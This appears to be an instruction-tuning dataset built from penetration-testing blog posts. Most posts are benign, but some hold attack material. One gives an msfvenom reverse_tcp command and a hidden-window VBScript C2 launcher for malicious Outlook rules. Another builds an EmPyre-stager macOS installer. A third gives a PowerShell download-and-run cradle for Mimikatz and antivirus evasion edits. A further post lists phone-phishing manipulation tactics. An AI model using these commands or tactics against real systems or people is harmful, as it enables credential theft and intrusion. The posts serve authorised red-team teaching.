        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>BHIS's Annual Infosecker's* Gift-List</title>\n<taxonomies>Fun & Games, christmas, gifts, holidays, infosecker, presents</taxonomies>\n<creation_date>Fri, 09 Dec 2016 16:06:36 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sierra Ward Staff Buying gifts can be tough especially for your family members who are totally mystified by your profession Don't you hack the stuff with the things Have no fear BHIS is here you can forward this on to them for a reference I've asked around and this list is infosecker approved I hope our testers didn't think I was asking because I was going to buy them things Mr Robot Seasons 1 2 Ahhhh binge watching isn't that what short winter days are for And if not short winter days then definitely holiday vacations and breaks For when you just can't get enough of the gritty depressing world of infosec at work Season 1 available on Amazon Prime Season 2 on DVD Blue Ray Or the iTunes store Protip you can't tell the difference between HD and SD on an iPhone so save some money and space The Cuckoo's Egg reads like fiction but isn't Back from the ancient world of 1986 this is for when you can't get enough of infosec at work but prefer reading If you feel like you're fighting the same battles over and over again at work go back to them and see how different things were They had dial-up modems Otherwise pretty much the same Death Wish Coffee From their website Death wish coffee is created by using the strongest combination of beans and a perfect roasting process Sounds delish This is Beau's favorite though we have yet to try any in the office We've added it to our office wish list as well hint hint I don't drink coffee but I hear it helps you not sleep -Kelsey Death wish coffee That sounds interesting -Brian F Wait what Kelsey How can you not drink coffee BB King Cardboard VR Glasses Because let's face it VR isn't QUITE there yet so in the meantime a box on your face should do the trick Also cheap Blisstime Google Cardboard V2.0 3d Glasses Vr Virtual Reality Cardboard Kit with Headband Fit for 3--6inch Screen Books are like the necktie of gifts some people think it's boring others love them You'll know how to proceed RTFM Red Team Field Manual by Ben Clark Because it's a classic reference and also this name brilliant Description from Amazon The Red Team Field Manual RTFM is a no fluff but thorough reference guide for serious Red Team members who routinely find themselves on a mission without Google or the time to scan through a man page The RTFM contains the basic syntax for commonly used Linux and Windows command line tools but it also encapsulates unique use cases for powerful tools such as Python and Windows PowerShell The RTFM will repeatedly save you time looking up the hard to remember Windows nuances such as Windows wmic and dsquery command line tools key registry values scheduled tasks syntax startup locations and Windows scripting More importantly it should teach you some new red team techniques I avoid Windows as actively as possible and this book helps me do that Now I don't have to learn Windows I can just reference it -Some BHIS Tester at some point The Web Application Hacker's Handbook There isn't a description on Amazon but check out this review by Jason Haddix from 2011 There's a running joke we have on our assessment team about the Web Application Hackers Handbook Every time we see a new technology or have to deal with a one-off situation we start doing research online only to find it was already referenced in WAHH somewhere We've all read this book several times too it's like Dafydd and Marcus sneak into our houses at night and add content Joking aside though there is no other reference for web hacking as thorough or complete as WAHH With WAHH2 the authors added a significant amount content and rehashed existing chapters that were already deeply technical The bonus in WAHH2 is its associated labs Dafydd and Marcus have been giving a live WAHH training for years and have now moved the stellar CTF like challenges to the cloud You can buy credits 7 for 1hr and move right along as you read the book MDSec.net When I say the labs are stellar I mean it The labs come almost straight from the class and start trivial and then get crazy The injection labs were by far my favorite housing 30-40 different injection types variants each between XSS SQLi The CTF in the class which i'll mention again is where the MDSec.com labs are based from gets ridiculous toward the end Even seasoned web testers fall around questions 14-16 But i digress WAHH2 is now the defacto buy for any pentest QA Audit team Its usage will surpass any other book on your bookshelf if you are doing practical testing 5 stars i'd give it 10 if I could Hacking Exposed Wireless The first six chapters cover everything you need to do a wireless assessment Really Fletch The Tangled Web A Guide to Securing Modern Web Applications 1st Edition by Michal Zalewski Ooh great book It's aging almost as well as The Cuckoo's Egg I think BB King Description from Amazon Modern web applications are built on a tangle of technologies that have been developed over time and then haphazardly pieced together Every piece of the web application stack from HTTP requests to browser-side scripts comes with important yet subtle security consequences To keep users safe it is essential for developers to confidently navigate this landscape In The Tangled Web Michal Zalewski one of the world's top browser security experts offers a compelling narrative that explains exactly how browsers work and why they're fundamentally insecure Rather than dispense simplistic advice on vulnerabilities Zalewski examines the entire browser security model revealing weak points and providing crucial information for shoring up web application security You'll learn how to Perform common but surprisingly complex tasks such as URL parsing and HTML sanitization Use modern security features like Strict Transport Security Content Security Policy and Cross-Origin Resource Sharing Leverage many variants of the same-origin policy to safely compartmentalize complex web applications and protect user credentials in case of XSS bugs Build mashups and embed gadgets without getting stung by the tricky frame navigation policy Embed or host user-supplied content without running into the trap of content sniffing For quick reference Security Engineering Cheat Sheets at the end of each chapter offer ready solutions to problems you're most likely to encounter With coverage extending as far as planned HTML5 features The Tangled Web will help you create secure web applications that stand the test of time ..or at least realize you're not alone when they don't BB King Raspberry Pi 3 Zero Spend Christmas break building some of this years BHIS projects Beau's post Jordan's post OMG It's so tiny and adorable I'll take 10 -All people everywhere Can we please get a hundred of these and build a supercomputer -Lawrence paraphrased Adafruit Feather boards If the Raspberry Pi is too straightforward try one of these There are a bajillion options so pick one and challenge your hacker to find a creative use WiFi Bluetooth Packet radio Data logger Tell us what they build USB data blocker stocking stuffers You rent a car and it has a handy-dandy USB charging port But do you really need that rental car to have access to all of your phone's data NO Use this so that all that comes through that USB port is power and not data transferring Can't we just bring our own wall adapters BB King No BB King no you can't There are ONLY usb sockets Gaaahhhh RFID blocking wallet Turns out you're not as crazy as people once thought to be wary of people stealing your credit card info Block all those pesky RFID thieves with this wallet The Badgy If you're feeling spendy and want to really pull out all the stops you might think about a Badgy Who wouldn't love a reason to print any kind of fake badge for physical pen tests Want -Kelsey more or less Geeky T-Shirts There's no place like 127.0.0.1 for the holidays either Hacking Fuel Yummy and how else are you going to become that 400lb hacker They're basically air they don't add any weight promise -Kelsey who doesn't eat Cheetos Good thing my keyboard keys are black otherwise they'd be orange -Gail who also doesn't eat Cheetos Pizza Bag I picked this specifically for Kelsey who loves food and also cutesy things But really who on your list wouldn't LOVE a pizza purse hahaha It's so happy why is a sparkly pizza bag almost 50 -Kelsey in a hangouts message Divided Keyboard For those scary moments when you're getting hacked and need assistance from a friend This might be one of our favorite hacking scenes from a TV show embed ww.youtube.com watch?v u8qgehH3kEQ embed Ergonomics fixes your back my wrists don't hurt anymore so much money blah blah worth it -Lawrence paraphrased That's exactly how Lawrence talks Sierra Treadmill Desk We keep hearing that sitting is as bad as smoking and it terrifies us as we have sitting jobs Last year we got on an office running kick and this year we're doing even more to combat early death from sitting Gail bought a treadmill desk and Kent built us all standing desks in the office painful Maybe your lucky infosec-er would like to walk Even a super slow walk over the course of a few hours burns beaucoup calories I never understood why people couldn't shut up about their treadmill desks I mean gawd so annoying right But now I can't shut up about mine I love it soooo hard -Gail paraphrased Burner Phone Did someone say a burner phone If you go to Walmart you're gonna have to break up your order into several parts but it turns out the Walmart cashiers don't care -Rick or Jordan on the fact that Walmart only lets you buy a certain number of burner phones at one time Other Ideas Anything from the Hak5 shop is cool I already have a Pineapple though -BHIS Tester You could always have two Pineapples -Another BHIS Tester And when all else fails some bitcoin is always great Then your InfoSecker can buy their own toys anonymously I thought bitcoin was dead -Kelsey Didn't everyone switch over to dogecoin -Someone who wasn't Kelsey promise Dogecoin is clearly not as important because I'VE never heard of it -Sierra office temperature of very average person Conclusion I hope you found some things for the infosecker in your life We're wishing you all the merriest and most wonderful of holidays ______ Why yes we did name this the InfoSecker's list because it's not just pentesters it's not just defenders but it's someone more specific than just regular IT person You saw it here first"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>PowerShell Logging for the Blue Team</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, Joff Thyer, Blue Team, Joff Thyer, PowerShell</taxonomies>\n<creation_date>Mon, 12 Dec 2016 16:51:50 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer It is no secret that PowerShell is increasingly being used as an offensive tool for attack purposes by both Red Teamers and Criminals alike Thanks to the efforts of a number of people in the industry we have tools like PowerSploit PowerShell Empire MailSniper and Bloodhound just to name a few of the top contenders While most of these tools are definitely post-exploitation in nature the ability of Red Teamers and attackers to trivially social engineer end users provides an easy path to extensive PowerShell usage Windows 7 is still prevalent in enterprise environments with the default installation version of PowerShell at 2.0 Unfortunately this version of PowerShell provides no real event logging ability thus leaving defenders largely blind with the exception of one PowerShell script signing policy Fortunately for defenders Microsoft has responded with significant PowerShell logging enhancements in the Windows Management Framework WMF starting with version 4.0 and version 5.0 If an organization is using Windows 10 then the Windows Management Framework is already installed at version 5.0 For those organizations still at Windows 7 it is advisable to upgrade all workstations to WMF version 5.0 bring PowerShell also up to version 5 In addition Windows 7 has a dependency on dot NET version 4.5 in order to install WMF 5.0 Once this is completed there are some additional event logging features enabled which include the following Module Logging logs PowerShell pipeline execution details during execution including variable initialization and command invocation Module logging is able to record some de-obfuscated scripts and also some output data This form of logging has actually been available since PowerShell 3.0 and will log all events to Event ID 4103 Script Block Logging logs and records all blocks of PowerShell code as they are executing The full contents of the code including the entire script and all commands are captured Script block logging also captures all de-obfuscated code due to the object-oriented nature of its implemented For example if a script is base64 encoded using the -Encoded command argument script block logging will log the actual decoded script block during execution Unlike module logging script block logging does not log the output from executed scripts If an event exceeds the maximum event log message size script block logging will split the logged events into multiple events Additionally in PowerShell 5.0 script block logging will log events that match a list of suspicious commands at a logging level of warning The normal logging level will be verbose or informational when enabled The suspicious events will be logged regardless unless script block logging is explicitly disabled All script block logging events are logged as event ID 4104 In addition to this event there is an option to log script block execution start and stop events as event ID 4105 and 4106 In my experimentation enabling this option also provides little additional benefit at the cost of many more events being logged thus I chose to leave this option disabled Full Transcription Logging logs a full transcript of every single PowerShell session with input and output data The transcripts are written to individual files with a naming convention that prevents name collisions It is important to note that transcription only records what appears in the PowerShell terminal windows which does include the contents of scripts or output written directly to the file system While the transcripts are written by default to the documents folder this is configurable It would be advisable to write the transcripts to something like a network share to avoid being deleted and or modified by an attacker After performing the required upgrade to WMF 5 and PowerShell 5 if using Windows 7 the next step is to enable the logging options All of these options can be enabled through group policy however be aware that the appropriate Windows 10 administrative template files need to be installed before the group policy options will be visible Not being a former Windows system administrator I struggled through this for a while before I found the administrative template download located at this Microsoft web page ww.microsoft.com en-us download details.aspx?id 48257 Note that after installation of the administrative templates your task is not over All that the installation actually does is copy the files into the Program Files x86 Microsoft Group Policy directory It is up to you to move the appropriate PowerShellExecutionPolicy.admx and the PowerShellExecutionPolicy.adml into the correct locations on your system In a domain environment the SYSVOL can also be used to deploy administrative templates by using the SYSVOL Policies Policy Definitions directory After doing this your local or domain group policy should contain the additional logging options both in the computer and user configuration areas The path to the configuration under each area is Policies Administrative Templates Windows PowerShell Group Policy Editor Screenshot Once you have defined these group policy options the actual events will be logged on the local system in the Applications and Services Logs as follows Applications and Services Microsoft Windows PowerShell Operational The following screenshot was taken after establishing a PowerShell empire session on a remote system In the process many different script block log entries were created showing important detailed information on all of the different script blocks being executed You can also see in this event log that a couple of entries are logged at a Warning level indicating potentially suspicious code being executed Having said all this do yourselves a favor and get WMF 5.0 installed in your environment followed by enabling script block logging at minimum Friends don't let friends run PowerShell without logging Of course I am assuming that you are all happily planning on collecting these event logs centrally right Happy hunting"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Bite the Pages of an Ebook: Tiny People Need to See You Get Excited about Electronic Text</title>\n<taxonomies>InfoSec 101, ebooks, electronic text, Millineals, reading online, reading with children, reading with kids, tiny people</taxonomies>\n<creation_date>Wed, 14 Dec 2016 17:48:57 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Gail Menius We avoid tasks that are too hard When we avoid them consciously or unconsciously the things we do instead are called avoidance behaviors Adults and teachers alike demonstrate avoidance behavior when it comes to digital print One of the main ways that parents can ensure their children learn to read is to demonstrate an interest in reading This is done by reading around them You can read anything it doesn't matter Children imitate activities we enjoy and show them we enjoy If we model avoidance behaviors when it comes to reading electronic texts the children in our lives will be in my opinion less likely to be able to read things like websites articles and online dictionaries In a world where digital print is not just an option but in many cases the standard avoidance behavior when it comes to digital print cannot be tolerated If you are worried about the children in your life not having the life skills necessary to navigate to safe quality websites you are correct If you fear that children don't really understand what they are reading on the screen your fears are validated But there are resources to help children of all ages to navigate safely and understand what they read Common Sense Media is a great resource But in this blog post I will specifically address how our negative attitude towards digital print transfers to our children and explain why we should not avoid reading and teaching children to read digital print Digital print is all around us We read Twitter for professional development Reddit for entertainment use Flipboard and news websites CNN FOX news Washington Post to educate ourselves as a member of our wider community It's not just news sites that we don't understand The other day my husband misunderstood a text because he was using skills that he learned from reading printed text in order to understand what our friend was trying to tell us about a birthday brunch Here is a short story about this misunderstanding A Personal Story about Digital Misunderstanding On December 9th my husband and I got a text from our friend Jamie It read something like this Tony's birthday is on Sunday We will all be working on Sunday so we thought we'd do lunch on Saturday at 11 15 Will you be joining us I need to make a reservation Friday night as I was going to bed I assumed that my husband set the alarm for us to get to brunch on time because he responded to the group text that we would like them to add us to the reservation I woke up at 11 30 I looked at my husband and said What day was that brunch Sunday he said I smiled to myself realizing that electronic text includes not only pdf's or ebooks it also includes texts you send on your phone I said to my husband realizing that a whirlwind of showers and panic-getting ready was in store for us I think you should check again Most of us simply don't have the comprehension skills necessary to accumulate evidence synthesize our experiences and propose a position supported by text we find online Millennials Are not Immune to Misunderstanding Digital Print Generation X Baby Boomers all of us older folk are all at a disadvantage for reading electronic text Most of us simply don't have the comprehension skills necessary to accumulate evidence synthesize our experiences and propose a position supported by text we find online In school we were taught to read books and articles printed on a page We were not taught to read online This lack of exposure to electronic texts can be seen even in my world as a project manager for BHIS I have seen information security professionals accidentally click on an advertisement I have also seen them only answer one of three questions proposed on an email It's not a criticism it's just that we haven't been equipped with the strategies and skills necessary to be effective and safe online This lack of skill does not just pertain to Generation X and older Millennials also have difficulty with electronic text Studying for my undergraduate degree also showed me evidence that Millennials didn't know how to process electronic texts The printer at my college was consistently hot printing article after article which students needed in order to write their papers It would cost them 5 cents a page and some of these poor students were printing out articles that were a hundred pages of text or more Why would frugal college students be printing out articles It's because they understand an article better if it's printed As an elementary literacy teacher and coach in the Rapid City Area School District I noticed that teachers were also hesitant to give students electronic text The majority of their reading is done either on paper or in books held in their hands turning the pages one by one The argument that I heard over and over again is that students just don't understand what they're reading if it's on a screen Playing with Books is Learning Concepts of Print Have you ever seen a toddler with a board book Toddlers don't read the pages they flip through them bite one them they explore the format of the text the concepts of print before they're ever ready to read I argue that electronic texts have a format as well many formats in fact If we never give children electronic texts the same is true they'll flip through the pages glance at pictures much like a toddler does with a board book We have electronic books articles downloaded as PDFs web pages and these are just three of the many types of electronic texts we are exposed to If we never give children a magazine they'll never know how to read one If we never give children electronic texts the same is true they'll flip through the pages glance at pictures much like a toddler does with a board book Just because we don't feel at ease reading an ebook or article doesn't mean our children can't learn Digital Print is the Standard People of all ages have the ability to learn to digest information in electronic format But you never stop learning how to read better no matter what the format Electronic format is an increasingly important way to read and your skill influences your attitude to what your children will read If your attitude towards reading a PDF or an ebook is that you would prefer a print book that my friends means that you have more comprehension skills and strategies for a print book than electronic text And electronic text is not the future of information it is the standard Find Easy Books to Enjoy with your children People find their lives and experiences more rich if the challenge they are presented matches their skill If you or your children do not enjoy electronic text the answer is that your family needs to increase your skill The simplest way to help your children increase their skill is to find their zone of proximal development The Zone of Proximal Development is a fancy way of saying Find a skill that is a little bit too hard for the child and teach them Find a single skill to teach like turning pages and show them how to do it Then do it with them Then they can do it on their own The trick is to find that skill My advice watch them try to read an easy book on a kindle Praise them for what they do well and find one thing to help them with Just teach them that one skill for a week or more One student said I would have liked an easier book so that I could learn how to use the Kindle better When teaching children how to read electronic books find an easy book The challenge shouldn't be the words you want the challenge to be navigating the text Find a book that is easy for them to read so they may concentrate on learning how to understand the format When I asked my 5th grade students what would have made reading on an ebook a more pleasant experience I got valuable advice One student said I would have liked an easier book so that I could learn how to use the Kindle better What she was trying to say was that her cognitive demand was too high because she was working on her reading skill while she was presented with a challenging book If you have nostalgia for old books please continue to read and enjoy them but for your child's sake let them bite the pages of their electronic board book Read easy articles to them that you find online from National Geographic for Kids Borrow electronic books from your local library and have lap time with your little ones Show your 4th graders how to avoid clicking on ads And above all keep a positive attitude about reading electronic texts Children know how you feel about reading articles and books you find online The best moments in our lives are not the passive receptive relaxing times The best moments usually occur if a person's body or mind is stretched to its limits in a voluntary effort to accomplish something difficult and worthwhile Mihaly Csikszentmihalyi 1990 p 3 Works Cited ww.pursuit-of-happiness.org history-of-happiness mihaly-csikszentmihalyi esearchguides.weebly.com e-books-audiobooks-and-video-from-overdrive.html ids.nationalgeographic.com"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>A Marketer's Lessons in Con Artistry for Good & Learning</title>\n<taxonomies>Phishing, Red Team, con artistry, Marketing, pen-testing, penetration testing, Pentesting, phishing, social engineering</taxonomies>\n<creation_date>Fri, 16 Dec 2016 19:21:51 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sierra Ward Normally I am hidden in the back rooms at BHIS chipping away at 10 million marketing tasks I show up occasionally in webcasts lurking again in the shadows answering your questions and talking with people on the chat My most public appearances aren't even me as I hammer away on social media but behind the shield of BHIS pun intended This puts me often times in an interesting position because while I represent a pen testing company on social media I don't in fact security bro The classic pentesting marketers quandary as referenced by Jason Blanchard in his DerbyCon talk Except I do ..kinda Lately I've found a niche market for marketing skills in the world of pentesting As one of the testers said at its heart marketing is persuasion As a marketer your job is to persuade people to trust the company to build relationships and to generate good feelings which yes can sometimes seem sleazy manipulative and full of marketing mumbo jumbo nonsense John and I both share an abhorrence for that kind of marketing and I try very sincerely to never make marketing at BHIS any of those things But persuasion feeds brilliantly into social engineering where your main job is to persuade people to do what you want need You come up with a ruse figure out how to be convincing and go after your assigned marks the client always okays all ruses and knows all aspects of the plan before we start While it feels very much like con artistry it's not con artistry because we're not really bad guys who are after your sensitive data just pretending to be bad for practice your practice After helping on several of the phishing portion of tests we've done this year here are tips both doing phishing calls and on the flip side spotting phishing calls General Tips Remember people have been taught very carefully to avoid suspicious emails But not as much time has been taken to teach them to recognize suspicious phone calls Your best bet is calling People very rarely care what area code you call from What's more valuable is the quality of the phone connection I have had people call me back to confirm I was who I said I was but that was easily mitigated by answering the phone call as the person I had just claimed to be at the company I said I was calling from Live in your role and realize that in this role you aren't lying Part of what makes phishing calls difficult is that you're lying bold-faced lying and for normal non sociopathic people this can be difficult But since this is part of work and you are seriously wanting this company and its employees to understand the dangers of phishing phone calls you need to actually sell these calls and service you are doing is truly good When I'm doing these calls I am both hoping to succeed and also desperately to fail I give employees who refuse my requests an air high-five and silently congratulate them on their job well done Appeal to a person's sense of duty -We look back through history and say how could normal family men and otherwise good people be Nazi prison guards during WWII Because someone in authority told them to do something and all of us generally want to please the people who are in authority over us I wish I could say these sorts of appeals weren't as easy as they are -With this in mind don't ask someone to do something kindly but firmly tell them you are in authority and that you're not really asking as much as telling This can be a tricky line to walk because people also hate being bossed around But don't let's them say no just keep telling Build credibility by back-feeding information -Confirm their email or any other information you may have like location birthdate etc to establish that you are a person in the know who has authority -This also helps if you need to get more pieces of information you establish trust by offering a few pieces and then ask for the rest Appeal to a person's willingness to help -People are generally helpful especially if you can play a floundering card I'll get in so much trouble if you don't help me Make a role for yourself where you aren't accountable to direct questions If you're talking to tech people play ignorant in my case this is easy If you're talking non tech people play tech person I am calling for my husband and don't know the details of the account I am just doing my job would you like to talk to my boss Misdirection is your friend -Make the goal something deeper than your true intended goal I.e you need them to log in to a portal but don't make that the point but something beyond that so that they don't get distracted by logging into the portal it is only part of the needed process -If they ask questions just ask them more questions until they forget their original hesitancy Stress the urgency of the matter This matter is extremely time sensitive -You need the information before you get in trouble from your boss spouse Stress how thankful you are for their help -Customer service reps are taught to be gracious and helpful -People are more prone to do what you ask if you're nice On calls I've had people even offer to try the link I've emailed on their home computers when they're not on the clock If I were a bad guy and you logged in at home I'd also have your home computer information and location yes Please give that to me also People's critical thinking and self-control is at a low in the mid afternoon -Ever given into a sweet tooth craving at 3pm Appeal to that by calling in this time frame where they are less likely to refuse your requests even if they are suspicious and you're asking them to do something they've been specifically trained not to do People are more likely to just be in a rush to finish the day at this time Learn when to bail when not to bail -This can be tricky because it's sometimes more suspicious to hang up on someone -If they put you on hold or go get their manager hang tight Sometimes you can get a manager to do what you couldn't get the employee to do Build credibility -If you get hesitancy early in your calls hang up and keep going this person is the most likely to call security and shut your whole operation down -If they put you on hold hang up and call back saying you got disconnected -If they get hostile assure them you're from headquarters IT HR the bosses Conclusion When in doubt remember your job is to try not to succeed ultimately this is training not real phishing so it's okay to give up if they really won't comply with your request These same ideas are useful as we spot people in other areas of our own lives who may be trying to manipulate us As always stay cautious out there Up next for this marketer Maybe I'll try my hand at physical testing though after reading Sally's account I have to admit I was having some cold sweats thinking about those anxiety inducing thrills _______ A big shout out to Kelsey Bellew for helping and giving ideas she's another social engineering rock star"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Malicious Outlook Rule without an EXE</title>\n<taxonomies>C2, Red Team, exploit, malicious outlook rules, Outlook, Sacred Cash Cow Tipping</taxonomies>\n<creation_date>Tue, 20 Dec 2016 16:16:15 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts My current favorite exploit is creating malicious outlook rules as described here The rule is configured to download an executable file with an EXE extension .exe when an email with a certain subject line is received The executable establishes a command and control C2 session with the attacker's server On a recent assessment I ran into a situation where the customer network I was testing had firewall rules in place that did not allow download of any file with an EXE extension When the outlook rule triggered the user would see the following error and no C2 session was established I found that downloading PowerShell files with a .ps1 extension was allowed but when the rule triggered the script was simply opened in a text editor and not executed I visited this site to review other Windows executable extensions that may be allowed for download as well as automatically execute I found that downloading HTA BAT VB VBS and VBSCRIPT files were also blocked but VBE files were allowed With one hurdle overcome I proceeded to generate a Visual Basic script to establish the C2 connection using the msfvenom tool as follows msfvenom -a x86 --platform windows -p windows meterpreter reverse_tcp LHOST LPORT 443 -f vbs Unfortunately this was caught by Symantec EndPoint Protection and blocked from running on the target Instead I manually created the script using two lines of code similar to the following Set objShell CreateObject Wscript.shell objShell.run powershell -window hidden -EncodedCommand JA ..snip A Note that the encoded command has been shortened snipped in the code above for brevity The PowerShell command shown in the second line of code was generated by the Unicorn tool with the command below see ithub.com trustedsec unicorn unicorn.py windows meterpreter reverse_tcp 443 One drawback to the proposed VBE method is that it causes a command window to pop up for a split second when it executes which may alert the victim that something suspicious just happened Let's adjust the second line of our script passing in a second parameter of 0 This instructs the script to hide the window Oddly enough you have to remove the surrounding parenthesis from the method call to add this parameter The new and improved VB script is shown below Set objShell CreateObject Wscript.shell objShell.run powershell -window hidden -EncodedCommand JA ..snip A 0 And that did it I can now establish a C2 session by sending an email to the target without requiring an EXE file to pass through the firewall ______ For detailed instructions on creating malicious outlook rules see this post ______ This will also be covered in our soon to be scheduled Sacred Cash Cow Tipping webcast Stay tuned on Twitter for more details"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Phish for Geniuses</title>\n<taxonomies>Author, C2, David Fletcher, Red Team, Apple, Install, Mac, Malware, phishing</taxonomies>\n<creation_date>Tue, 03 Jan 2017 15:52:25 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher Recently we were involved in an engagement where we expected to see a large number of Macs in the target environment As an element of the engagement we decided to investigate options for delivery of malware to these devices The following outlines one of the methods we were able to explore and use Note This is not a new technique by any means It is an adaptation of the method that Carlos Perez describes at ww.darkoperator.com blog 2009 4 25 evil-packaging-on-osx-with-xcode-and-metasploit.html Unfortunately it appears that Apple dropped support for Package Maker in recent versions of XCode and it can no longer be installed as an add-on to the XCode environment After doing some research I stumbled across the following blog post describing development of payload free packages using the OSX pkgbuild utilities erflounder.wordpress.com 2012 08 15 creating-payload-free-packages-with-pkgbuild The valuable element of this post is that we can create a shell script called postinstall without requiring a package payload and generate a pkg file which will run a wizard style installer executing our script at the end Armed with this knowledge it immediately occurred to us that EmPyre would be the perfect tool to generate the contents of our postinstall script Selection and generation of the EmPyre bash stager module outputs a bash script that includes a base64 encoded stager which executes and deletes itself as seen below The shell script output by EmPyre is then copied into a file called postinstall and marked as executable This file is then placed inside our package folder it can be named anything within the scripts directory In the example below we simply created a folder called Malware_Package which contained the scripts directory Within that directory you can see our postinstall shell script At this point we could create our package which would launch our payload on the target computer However running an installer driving through the wizard and not having the expected software installed may appear suspicious to an end user To fix this we can modify our payload script to include a couple of useful popup messages that might deter targeted users from investigating any further The following modified shell script will output such a popup message With the calls to osascript at the end of our shell script the popup message will appear after our malicious payload has executed After completing these simple tasks we are prepared to build our final package for delivery We can accomplish this using the pkgbuild utility as seen below The interesting elements of the command invocation are the --nopayload and --scripts folder arguments The final product is the pkg file which can be delivered to the target The wizard installer that we just created executes as seen below Launch the introduction to the wizard Select the location to install the package The application then prompts for permission to install The user supplies root level credentials to continue the install process and execute our agent as root One of our popup messages indicating that the package will communicate with the internet our agent in reality Oh no...an error Ahh...the installation was successful Back at our C2 server we see the following This is just the tip of the iceberg With a full blown installer environment we can make installer packages that look extremely realistic and mimic the behaviors of their legitimate cousins Yet another reason to train users with the ability to install software to check signatures and only execute software from truly legitimate sources With the majority of mail filters and proxies focusing on Windows and office automation infection vectors would a malicious pkg file make it into your environment"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Bypass Anti-Virus to Run Mimikatz</title>\n<taxonomies>Red Team, Red Team Tools, All the AVs, anti-virus, bypassing AV, Carrie Roberts, mimikatz, Windows Defender</taxonomies>\n<creation_date>Thu, 05 Jan 2017 15:34:23 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Would you like to run Mimikatz without Anti-Virus AV detecting it Recently I attempted running the PowerShell script Invoke-Mimikatz from PowerSploit on my machine but it was flagged by Windows Defender as malicious when saving the file to disk Even when I ran this file without writing it to disk using the following command it still got caught powershell IEX New-Object Net.WebClient .DownloadString 'aw.githubusercontent.com PowerShellMafia PowerSploit master Exfiltration Invoke-Mimikatz.ps1 Invoke-Mimikatz Windows Defender Detects Unmodified Mimikatz Script Uploading the Invoke-Mimikatz.ps1 file to VirusTotal showed that 19 of 54 AV vendors currently detect this file as malicious AV Detection Rate for Unmodified Mimikatz Script While uploading to VirusTotal is not a conclusive way to determine if a malicious file will be detected it can hint to what AV may be triggering on As you may know AV detection schemes can be weak simply looking for specific words in the file Often these words can be changed without changing the functionality For example changing Invoke-Mimikatz to Invoke-Mimidogz using the following Linux command brings the detection rate down to 8 of 54 sed -i -e 's Invoke-Mimikatz Invoke-Mimidogz g Invoke-Mimikatz.ps1 AV Detection Rate for Katz to Dogz And how about getting rid of those unnecessary comments in the script sed -i -e c Invoke-Mimikatz.ps1 sed -i -e 's space g Invoke-Mimikatz.ps1 AV Detection Ratio After Removing Comments from Script We are down to four 4 AV vendors detecting the malicious file after renaming Katz to Dogz and removing comments A little further experimentation shows that AV doesn't like the word DumpCreds let's change it to DumpCred sed -i -e 's DumpCreds DumpCred g Invoke-Mimikatz.ps1 AV Detection After Renaming DumpCreds We could probably quit here and get a lot of mileage out of this script but as my daughter would say after reading the disclaimer on hand sanitizer Why don't they just put a little bit more in and kill 'em all So let's do this Just add 